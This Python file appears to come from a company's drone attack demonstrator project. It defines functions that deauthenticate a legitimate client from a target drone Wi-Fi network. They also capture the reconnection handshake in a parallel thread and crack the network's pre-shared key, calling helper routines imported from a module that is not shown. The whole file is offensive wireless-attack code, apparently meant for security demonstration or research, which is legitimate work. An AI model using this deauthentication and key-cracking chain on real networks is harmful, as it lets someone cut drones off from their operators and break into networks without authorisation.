#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##############################################################################
# Owner     : Expleo Group
# Author    : Tarek AZAIZ
# Project   : Drones Attack Demonstrator
# Subject   : Deauthenticate a legitime user frome the target drone network
# Version   : 0.1
# Created   : 2022/03/31
# Modified  : 2022/05/04
##############################################################################

#import pandas
from pydoc import cli
import threading
from src.wifi.wifi_nw_tools import *

def deauth_client(ap_bssid, cli_bssid, chan, essid
    , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
    restore_interf(mng_interf)
    start_mon(chan, mng_interf)
    deauth(ap_bssid, cli_bssid, essid, mon_interf)
    restore_interf(mng_interf)
#connect(TARGET_NW_BSSID)



def crack_wifi(ap_bssid, cli_bssid, chan, essid
    , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
    , duration=CLI_DUMP_DURATION):

    # device preparing
    restore_interf(mng_interf)
    start_mon(chan, mng_interf)

    # dumping thread
    t1 = threading.Thread(target=dump_specific_nw
        , args=(ap_bssid, chan, mon_interf, duration)
    )
    
    # deauth thread
    t2 = threading.Thread(target=deauth
        , args=(ap_bssid, cli_bssid, essid, mon_interf)
    )
    
    print("Démarrage thread 1 (dump)")
    t1.start()

    print("Démarrage thread 2 (deauth)")
    t2.start()

    t2.join()
    print("Thread 2 (deauth) terminé")

    t1.join()
    print("Thread 1 (dump) terminé")
    
    # device state restoring
    restore_interf(mng_interf)

    # pre-shared key cracking
    crack(ap_bssid, essid)

